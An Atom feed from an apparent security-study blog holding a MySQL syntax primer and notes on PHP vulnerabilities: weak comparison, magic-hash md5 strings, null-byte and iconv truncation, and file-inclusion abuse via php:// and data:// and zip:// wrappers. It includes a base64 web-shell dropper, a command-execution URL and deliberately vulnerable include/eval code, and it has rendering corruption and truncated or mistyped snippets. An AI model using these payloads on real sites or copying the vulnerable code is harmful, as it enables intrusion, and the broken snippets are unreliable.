<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zpdad26.github.io/</id>
    <title>z3p.l0ve</title>
    <updated>2020-12-01T08:36:16.195Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zpdad26.github.io/"/>
    <link rel="self" href="https://zpdad26.github.io/atom.xml"/>
    <subtitle>NO PATCH FOR STUPID!</subtitle>
    <logo>https://zpdad26.github.io/images/avatar.png</logo>
    <icon>https://zpdad26.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, z3p.l0ve</rights>
    <entry>
        <title type="html"><![CDATA[mysql基础语法]]></title>
        <id>https://zpdad26.github.io/post/mysql-ji-chu-yu-fa/</id>
        <link href="https://zpdad26.github.io/post/mysql-ji-chu-yu-fa/">
        </link>
        <updated>2020-12-01T08:13:37.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="一些最重要的-sql-命令">一些最重要的 SQL 命令:</h2>
<pre><code>CREATE DATABASE - 创建新数据库
ALTER DATABASE - 修改数据库
CREATE TABLE - 创建新表
ALTER TABLE - 变更（改变）表
DROP TABLE - 删除表
SELECT - 从数据库中提取数据
UPDATE - 更新数据库中的数据
DELETE - 从数据库中删除数据
INSERT INTO - 向数据库中插入新数据
CREATE INDEX - 创建索引（搜索键）
DROP INDEX - 删除索引
</code></pre>
<h2 id="select-语句">SELECT 语句</h2>
<p>SELECT 语句用于从数据库中选取数据<br>
语法：</p>
<pre><code>SELECT column_name,column_name FROM table_name; 
SELECT * FROM table_name; 
</code></pre>
<h2 id="select-distinct-语句">SELECT DISTINCT 语句</h2>
<pre><code>SELECT DISTINCT column_name,column_name FROM table_name; 
</code></pre>
<h2 id="where-子句">WHERE 子句</h2>
<p>WHERE 子句用于提取那些满足指定标准的记录<br>
语法：</p>
<pre><code>ELECT column_name,column_name FROM table_name WHERE column_name operator value;
</code></pre>
<p>举例：</p>
<pre><code>--从 &quot;Websites&quot; 表中选取国家为 &quot;CN&quot; 的所有网站 
SELECT * FROM Websites WHERE country='CN'; 
</code></pre>
<p>注：SQL 使用单引号来环绕文本值，如果是数值字段，不要使用引号</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="一些最重要的-sql-命令">一些最重要的 SQL 命令:</h2>
<pre><code>CREATE DATABASE - 创建新数据库
ALTER DATABASE - 修改数据库
CREATE TABLE - 创建新表
ALTER TABLE - 变更（改变）表
DROP TABLE - 删除表
SELECT - 从数据库中提取数据
UPDATE - 更新数据库中的数据
DELETE - 从数据库中删除数据
INSERT INTO - 向数据库中插入新数据
CREATE INDEX - 创建索引（搜索键）
DROP INDEX - 删除索引
</code></pre>
<h2 id="select-语句">SELECT 语句</h2>
<p>SELECT 语句用于从数据库中选取数据<br>
语法：</p>
<pre><code>SELECT column_name,column_name FROM table_name; 
SELECT * FROM table_name; 
</code></pre>
<h2 id="select-distinct-语句">SELECT DISTINCT 语句</h2>
<pre><code>SELECT DISTINCT column_name,column_name FROM table_name; 
</code></pre>
<h2 id="where-子句">WHERE 子句</h2>
<p>WHERE 子句用于提取那些满足指定标准的记录<br>
语法：</p>
<pre><code>ELECT column_name,column_name FROM table_name WHERE column_name operator value;
</code></pre>
<p>举例：</p>
<pre><code>--从 &quot;Websites&quot; 表中选取国家为 &quot;CN&quot; 的所有网站 
SELECT * FROM Websites WHERE country='CN'; 
</code></pre>
<p>注：SQL 使用单引号来环绕文本值，如果是数值字段，不要使用引号</p>
<!-- more -->
<h3 id="where-子句中的运算符">WHERE 子句中的运算符：</h3>
<p>运算符描述=等于&lt;&gt;不等于。</p>
<p>注释：在 SQL 的一些版本中，该操作符可被写成 !=&gt;大于&lt;小于&gt;=大于等于&lt;=小于等于BETWEEN在某个范围内LIKE搜索某种模式IN指定针对某个列的多个可能值</p>
<!-- more -->
<h3 id="where-子句-2">Where 子句：</h3>
<p>搜索 empno 等于 7900 的数据：</p>
<pre><code>Select * from emp where empno=7900; 
</code></pre>
<h3 id="where-条件筛选行">Where +条件（筛选行）：</h3>
<p>条件：列，比较运算符，值</p>
<p>比较运算符包涵：= &gt; &lt; &gt;= ,&lt;=, !=,&lt;&gt; 表示（不等于）</p>
<pre><code>Select * from emp where ename='SMITH'; 
</code></pre>
<p>例子中的 SMITH 用单引号引起来，表示是字符串，字符串要区分大小写。</p>
<!-- more -->
<h2 id="逻辑运算">逻辑运算：</h2>
<p>1.And:与 同时满足两个条件的值。</p>
<pre><code>Select * from emp where sal &gt; 2000 and sal &lt; 3000; 
</code></pre>
<p>2.Or:或 满足其中一个条件的值</p>
<pre><code>Select * from emp where sal &gt; 2000 or comm &gt; 500;//查询 emp 表中 SAL 大于 2000 或 COMM 大于500的值。
</code></pre>
<p>3.Not:非 满足不包含该条件的值。</p>
<pre><code>select * from emp where not sal &gt; 1500; //查询EMP表中 sal 小于等于 1500 的值。
</code></pre>
<h4 id="逻辑运算的优先级-not-and-or">逻辑运算的优先级：() not and or</h4>
<h3 id="特殊条件">特殊条件：</h3>
<h4 id="1空值判断-is-null">1.空值判断： is null</h4>
<pre><code>Select * from emp where comm is null; //查询 emp 表中 comm 列中的空值。
</code></pre>
<h4 id="2between-and-在-之间的值">2.between and (在 之间的值)</h4>
<pre><code>Select * from emp where sal between 1500 and 3000; //查询 emp 表中 SAL 列中大于 1500 的小于 3000 的值。
</code></pre>
<p>注意：大于等于 1500 且小于等于 3000， 1500 为下限，3000 为上限，下限在前，上限在后，查询的范围包涵有上下限的值。</p>
<p>####3.In</p>
<pre><code>Select * from emp where sal in (5000,3000,1500); //查询 EMP 表 SAL 列中等于 5000，3000，1500 的值。
</code></pre>
<h4 id="4like">4.like</h4>
<pre><code>Select * from emp where ename like 'M%'; //查询 EMP 表中 Ename 列中有 M 的值，M 为要查询内容中的模糊信息。
</code></pre>
<p>% 表示多个字值，_ 下划线表示一个字符；<br>
M% : 为能配符，正则表达式，表示的意思为模糊查询信息为 M 开头的。<br>
%M% : 表示查询包含M的所有内容。<br>
%M_ : 表示查询以M在倒数第二位的所有内容。</p>
<h2 id="and-or-运算符">AND &amp; OR 运算符：</h2>
<p>AND &amp; OR 运算符用于基于一个以上的条件对记录进行过滤</p>
<pre><code>--从 &quot;Websites&quot; 表中选取 alexa 排名大于 &quot;15&quot; 且国家为 &quot;CN&quot; 或 &quot;USA&quot; 的所有网站 
SELECT * FROM Websites WHERE alexa &gt; 15 AND (country='CN' OR count
</code></pre>
<h2 id="order-by-关键字">ORDER BY 关键字：</h2>
<p>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序，ORDER BY 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，可以使用 DESC 关键字<br>
语法：</p>
<pre><code>SELECT column_name,column_name FROM table_name 
ORDER BY column_name,column_name ASC|DESC; 
</code></pre>
<!-- more -->
<p>举例：</p>
<pre><code>--从 &quot;Websites&quot; 表中选取所有网站，并按照 &quot;alexa&quot; 列排序 
SELECT * FROM Websites ORDER BY alexa; 

--从 &quot;Websites&quot; 表中选取所有网站，并按照 &quot;alexa&quot; 列降序排序 
SELECT * FROM Websites ORDER BY alexa DESC; 

--从 &quot;Websites&quot; 表中选取所有网站，并按照 &quot;country&quot; 和 &quot;alexa&quot; 列排序 
SELECT * FROM Websites ORDER BY country,alexa; 
</code></pre>
<h2 id="insert-into-语句">INSERT INTO 语句：</h2>
<p>INSERT INTO 语句用于向表中插入新记录<br>
语法：<br>
INSERT INTO 语句可以有两种编写形式。<br>
第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：</p>
<pre><code>NSERT INTO table_name VALUES (value1,value2,value3,...); 
</code></pre>
<p>第二种形式需要指定列名及被插入的值：</p>
<pre><code>INSERT INTO table_name (column1,column2,column3,...) VALUES (value1,valu
</code></pre>
<p>###注：insert into select 和select into from 的区别</p>
<pre><code> --插入一行,要求表scorebak 必须存在 
insert into scorebak select * from socre where neza='neza' 
  
--也是插入一行,要求表scorebak 不存在 
select *  into scorebak from score  where neza='neza' 
</code></pre>
<p>##UPDATE 语句：<br>
UPDATE 语句用于更新表中已存在的记录</p>
<p>语法：</p>
<pre><code>UPDATE table_name SET column1=value1,column2=value2,... 
WHERE some_column=some_value; 
</code></pre>
<h2 id="delete-语句">DELETE 语句：</h2>
<p>DELETE 语句用于删除表中的行<br>
语法：</p>
<pre><code>DELETE FROM table_name WHERE some_column=some_value; 
</code></pre>
<h3 id="删除所有数据">删除所有数据：</h3>
<p>可以在不删除表的情况下，删除表中所有的行。这意味着表结构、属性、索引将保持不变：</p>
<pre><code>DELETE FROM table_name; 
DELETE * FROM table_name; 
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PHP漏洞]]></title>
        <id>https://zpdad26.github.io/post/yi-php-lou-dong/</id>
        <link href="https://zpdad26.github.io/post/yi-php-lou-dong/">
        </link>
        <updated>2020-11-27T04:51:21.000Z</updated>
        <summary type="html"><![CDATA[<p>在学习完php基础知识后，将一些常见的php漏洞分析写在下面：</p>
]]></summary>
        <content type="html"><![CDATA[<p>在学习完php基础知识后，将一些常见的php漏洞分析写在下面：</p>
<!-- more -->
<h2 id="一php语言特性">一.PHP语言特性：</h2>
<h3 id="111比较操作符导致的漏洞弱类型">1.1.1比较操作符“==”导致的漏洞（弱类型）</h3>
<pre><code>$a==$b
$a===$b

$a==$b//等于TURE,类型转换后$a=$b
$a===$b//全等TURE,如果$a=$b,那么他们的类型也相同
</code></pre>
<!-- more -->
<p>如上图为php手册上的例子，可知道“==”的比较会先进行类型转换，再进行比较。</p>
<pre><code>&lt;?php
'a'==0 // true '12a'==12 //true '1'==1 //true '1aaaa55sss66'==1 //true 
</code></pre>
<h3 id="112md5sha1漏洞">1.1.2md5&amp;sha1（）漏洞</h3>
<p>首先了解到xex代表科学输入法，1e123456=1*10的123456次方。这里要说的是在遇到了0exxx这种字符串时，会将这种字符串解析为科学计数法，即上图两个式子就相等了</p>
<pre><code>&quot;0x1e240&quot;==&quot;123456&quot; //true
&quot;0x1e240&quot;==123456 //true
&quot;0x1e240&quot;==&quot;1e240&quot;//false
</code></pre>
<p>这段话的意思就是在比较时，会先将字符串解析成十进制的再进行比较，图中0x1e240解析成十进制为123456</p>
<pre><code>QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
</code></pre>
<p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。如下：</p>
<pre><code>var_dump(@md5([]) == @md5([])) //bool(true) var_dump(@md5([]) === @md5([])) //bool(true)，@表示忽略警告 var_dump(null === null); //bool(true)
</code></pre>
<!-- more -->
<p>sha1原理与md5()基本相同</p>
<h3 id="12反序列化漏洞">1.2反序列化漏洞</h3>
<h4 id="121-概念分析">1.2.1 概念分析：</h4>
<p>序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p>
<!-- more -->
<p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p>
<!-- more -->PHP通过string serialize ( mixed $value )和mixed unserialize ( string $str )两个函数实现序列化和反序列化。这两种函数通过将任意类型的数据转换成string类型或者从string类型还原成任意类型
<!-- more --> php类可能会包含一些特殊的函数叫magic方法，magic方法命名是以符号__开头的，比如__construct()、__destruct()、__toString()、__sleep()、__wakeup()等等，这些函数在某些情况下会自动调用。一些magic函数及其用途如下：
<pre><code>__construct()当一个对象创建时被调用

__destruct()当一个对象销毁时被调用

__toString()当一个对象被当作一个字符串使用

__sleep() 在对象在被序列化之前运行

__wakeup将在序列化之后立即被调用所写的内容需要有对象中的成员变量的值
</code></pre>
<p>###1.3截断<br>
####1.3.1NULL(%00)截断原理：PHP内核由C语言实现，因此使用了C语言中的一些字符串处理函数，在遇到NULL字符时，处理函数就会将它当作结束标记。</p>
<h4 id="132利用方式">1.3.2利用方式：</h4>
<pre><code>在url中加入%00，如http://xxxx/shell.php%00.jpg
在burpsuite的16进制编辑工具将”shell.php .jpg”（带空格的）中间的空格由20改成00
</code></pre>
<!-- more -->url中的%00（形如%xx）,web server会把它当作十六进制处理，然后将该十六进制数据hex（00）“翻译”成统一的ascii码值“NUL（null）”，实现了截断。
<p>在2中，burpsuite用burp自带的十六进制编辑工具将”shell.php .jpg”(中间有空格)中的空格由20改成00，如果burp中有二进制编辑工具。</p>
<h4 id="133不正确的使用iconv函数新版本php已经得到修复">1.3.3不正确的使用iconv函数（新版本php已经得到修复）：</h4>
<p>在php中，所有的字符都是二进制的串，PHP本身并不认识任何编码，只是根据编码来显示内容。PHP中的chr() 函数从指定的 ASCII 值返回字符。ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</p>
<!-- more -->
<pre><code>&lt;?php
$file = $_GET['file'].'.tpl.html';
include(iconv(&quot;UTF-8&quot;, &quot;gb2312&quot;, $file));
?&gt;
</code></pre>
<p>在遇到file变量中包含非法字符utf-8的时候，iconv就会截断这个字符。</p>
<!-- more -->
<pre><code>&lt;?php
for($k=0;$k&lt;=255;$k++)
{
$a='shell.php'.chr($k).&quot;1.jpg&quot;;
echo 'k:'.$k.'   '.'$a:'.$a.'   '.'iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a):'.iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a).&quot;\n&quot;;
}
?&gt;
</code></pre>
<p>通过fuzz发现，其中 iconv(“UTF-8”,”gbk”,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>)</mo><mi mathvariant="normal">或</mi><mi mathvariant="normal">是</mi><mi>i</mi><mi>c</mi><mi>o</mi><mi>n</mi><mi>v</mi><mo>(</mo><mi mathvariant="normal">“</mi><mi>U</mi><mi>T</mi><mi>F</mi><mo>−</mo><mn>8</mn><mi mathvariant="normal">”</mi><mo separator="true">,</mo><mi mathvariant="normal">”</mi><mi>g</mi><mi>b</mi><mn>2313</mn><mi mathvariant="normal">”</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">a) 或是 iconv(“UTF-8”,”gb2313”,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">是</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord">“</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">8</span><span class="mord">”</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">”</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">b</span><span class="mord">2</span><span class="mord">3</span><span class="mord">1</span><span class="mord">3</span><span class="mord">”</span><span class="mpunct">,</span></span></span></span>a) 都会在chr(128)到chr(255)之间截断，使结果为shell.php<br>
<img src="https://zpdad26.github.io//post-images/1606800076252.jpg" alt="" loading="lazy"></p>
<h3 id="14伪协议漏洞">1.4伪协议漏洞</h3>
<figure data-type="image" tabindex="1"><img src="https://zpdad26.github.io//post-images/1606800199553.png" alt="" loading="lazy"></figure>
<h4 id="141phpinput将文件包含漏洞变成代码执行漏洞">1.4.1php://input将文件包含漏洞变成代码执行漏洞</h4>
<p>①目标网站存在包含漏洞</p>
<pre><code>&lt;?php @include($_GET[&quot;file&quot;])?&gt;
</code></pre>
<p>②使用php://input，将执行代码通过在POST data中提交<br>
<img src="https://zpdad26.github.io//post-images/1606800334163.png" alt="" loading="lazy"></p>
<h4 id="142-phpinput利用文件包含写入shell">1.4.2 php://input利用文件包含写入shell</h4>
<p>①目标网站存在包含漏洞</p>
<pre><code>&lt;?php @include($_GET[&quot;file&quot;])?&gt;
</code></pre>
<p>②使用php://input，将执行代码通过在POST data中提交</p>
<pre><code>#post方式提交
&lt;?php 
echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));
?&gt;
</code></pre>
<p>执行成功会在当前目录下生成一句话shell，可直接连接<br>
<img src="https://zpdad26.github.io//post-images/1606800421038.png" alt="" loading="lazy"></p>
<h4 id="143phpinput协议直接写入shell">1.4.3php://input协议直接写入shell</h4>
<p>①含有php://input的代码漏洞文件：(条件：allow_url_include = on&amp;allow_url_fopen()=on&amp; PHP &gt;= 5.2.0)</p>
<pre><code>&lt;?php 
$data = file_get_contents('php://input'); 
eval($data); 
?&gt;
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://zpdad26.github.io//post-images/1606800485125.png" alt="" loading="lazy"></figure>
<h4 id="144-phpfilter读取源代码">1.4.4 php://filter读取源代码</h4>
<p>php://filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：</p>
<pre><code>http://192.168.1.3/1.php?file=php://filter/read=convert.base64-encode/resource=1.php
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://zpdad26.github.io//post-images/1606800550406.png" alt="" loading="lazy"></figure>
<h4 id="145-file物理路径包含文件">1.4.5 file://物理路径包含文件</h4>
<p>file:// 协议在allow_url_fopen,allow_url_include都为off的情况下也可以正常使用：</p>
<pre><code>http://192.168.1.3/1.php?filename=file:///C:\\phpStudy\\WWW\\fileinclude\\2\\1.txt
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://zpdad26.github.io//post-images/1606800618230.png" alt="" loading="lazy"></figure>
<h4 id="146data利用文件包含data可进行命令执行">1.4.6data://：利用文件包含&amp;data://可进行命令执行</h4>
<pre><code>http://192.168.1.3/1.php?filename=data://text/plain,%3C?php%20system(%27whoami%27);?%3E
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://zpdad26.github.io//post-images/1606800674564.png" alt="" loading="lazy"></figure>
<h4 id="147zip绕过文件包含下的附加后缀">1.4.7zip://绕过文件包含下的附加后缀</h4>
<!-- more -->
<p>以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过%00截断进行绕过。但是%00截断在php版本5.3.4之后就失效了，而且还要考虑GPC，限制比较严重。除此之外，可以通过zip协议和phar协议来包含文件，突破附加后缀限制。</p>
<pre><code># 验证包含对象文件后缀是否为jpg，如果是才进行包含
&lt;?php
$file = $_GET['file'];
if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){
	include($file);
}
?&gt;
</code></pre>
<pre><code>#直接为包含对象添加jpg后缀，然后进行包含
&lt;?php
$file = $_GET['file'];
include($file.'.jpg');
?&gt;
</code></pre>
<p>绕过方法：<br>
①实战情况下往目标站点上传zip文件，里面压缩着一个jpg格式的php脚本。<br>
<img src="https://zpdad26.github.io//post-images/1606800758310.png" alt="" loading="lazy"><br>
②构造zip://php.zip#php.jpg，进行zip://伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可getshell。<br>
<img src="https://zpdad26.github.io//post-images/1606800784843.png" alt="" loading="lazy"></p>
<!-- more -->
<h3 id="15变量覆盖漏洞">1.5变量覆盖漏洞</h3>
<h4 id="151-变量覆盖">1.5.1 $$变量覆盖</h4>
<p>变量即可变变量，将一个变量的值加上 $ 来作为 另一个变量的名字；</p>
<pre><code>  &lt;?php
    $x = &quot;hello&quot;;
    $$x = 666;
    echo $x;
    echo &quot;&lt;br&gt;&quot;;
    echo $$x;
    echo &quot;&lt;br&gt;&quot;;
    echo $$x === $hello;
?&gt;
</code></pre>
<p>x将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi mathvariant="normal">拿</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">拼</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">上</mi></mrow><annotation encoding="application/x-tex">x的值hello拿来拼接上</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord cjk_fallback">拿</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">拼</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">上</span></span></span></span>变成了$hello,于是x === $hello<br>
<img src="https://zpdad26.github.io//post-images/1606800903783.png" alt="" loading="lazy"></p>
<h4 id="152-extract函数">1.5.2 extract（）函数</h4>
<p>extract(array,extract_rules,prefix)<br>
extract()函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中每个元素，将在当前符号表中创建一个对应的变量</p>
<pre><code>   &lt;?php
$a = 1;    //原变量值为1
$b = array('a' =&gt; '3');
extract($b);    //经过extract()函数对$b处理后
echo $a;    //输出结果为3
?&gt; 
</code></pre>
<h4 id="153-parse_str函数">1.5.3 parse_str()函数</h4>
<p>parse_str(string,array)**<br>
string必需。 规定要解析的字符串。array可选。 规定存储变量的数组名称。该参数指示变量存储到数组中<br>
如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p>
<pre><code> &lt;?php
$a = 1;                  //原变量值为1
parse_str('a=2');   //经过parse_str()函数后注册变量$a，重新赋值
print_r($b);          //输出结果为2
?&gt;
</code></pre>
<h4 id="154-import_request_variables函数">1.5.4 import_request_variables()函数</h4>
<p>bool import_request_variables(string<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi><mi>s</mi><mo>[</mo><mo separator="true">,</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">types[,string</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mopen">[</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>prefix] )<br>
$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀</p>
<pre><code>&lt;?php
$auth='0';
import_request_variables('G');
if($auth== 1){
echo&quot;private!&quot;;
}else{
echo&quot;public!&quot;;
}
?&gt;
</code></pre>
<p>get auth=1时，网页上会输出private！<br>
import_request_variables(‘G’)指定导入GET请求中的变量，从而导致变量覆盖</p>
]]></content>
    </entry>
</feed>